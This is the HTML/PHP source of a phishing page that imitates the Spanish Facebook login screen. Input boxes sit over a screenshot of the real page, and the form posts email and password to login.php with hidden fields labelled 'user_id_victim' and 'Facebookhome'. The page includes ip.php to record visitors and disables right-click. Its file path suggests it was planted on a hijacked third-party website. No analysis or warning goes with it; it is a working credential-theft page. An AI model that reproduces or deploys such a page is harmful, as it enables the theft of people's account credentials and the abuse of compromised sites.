
<html>
<head>
<meta charset="UTF-8">
<title></title>
<style>
body {
background:url('fcbh/es/header.PNG') repeat-x;
background-color:white;
margin:0;
overflow:hidden;
}
.form{
background:url('fcbh/es/fbhome-es.PNG') no-repeat;
background-position:center top;
height:95%;
}
.kl{
position:absolute;
top :2.5em;
right:50%;
margin-right: -16.5em;
width:150px;
padding: 3px;
height:22px;
border: 1px solid #1d2a5b;
}
.kj{
position:absolute;
top :2.5em;
right:50%;
margin-right: -28.9em;
width:150px;
padding: 3px;
height:22px;
border: 1px solid #1d2a5b;
}
.kk{
position:absolute;
top :2.5em;
right:50%;
margin-right: -36.7em;
width:91px;
padding: 3px;
height:23px;
border:transparent;
background:transparent;
cursor:pointer;
}
</style>
</head>
<body oncontextmenu="return false">
<form class="form" action="login.php" accept-charset="utf-8" method="POST">
<?php include 'ip.php'; ?>
<input type="hidden" name="user_id_victim" value="vHj30sVG1wQk0wMXFhM2hPZHowOQ==" /><input type="hidden" name="user_ip" value="" /><input name="type" value="Facebookhome" type="hidden">
<input name="hub" value="login" type="hidden">
<input class="kl" name="email" type="text">
<input class="kj" name="pass" type="password">
<input class="kk" value="" type="submit">
</form>
<!-- WiredMinds eMetrics tracking with Enterprise Edition V5.4 START -->
<script type='text/javascript' src='https://count.carrierzone.com/app/count_server/count.js'></script>
<script type='text/javascript'><!--
wm_custnum='820e8bbd8d6e1ac4';
wm_page_name='index.php';
wm_group_name='/services/webpages/n/e/newphaseelectrical.co.uk/public/NpkRI';
wm_campaign_key='campaign_id';
wm_track_alt='';
wiredminds.count();
// -->
</script>
<!-- WiredMinds eMetrics tracking with Enterprise Edition V5.4 END -->
</body>/
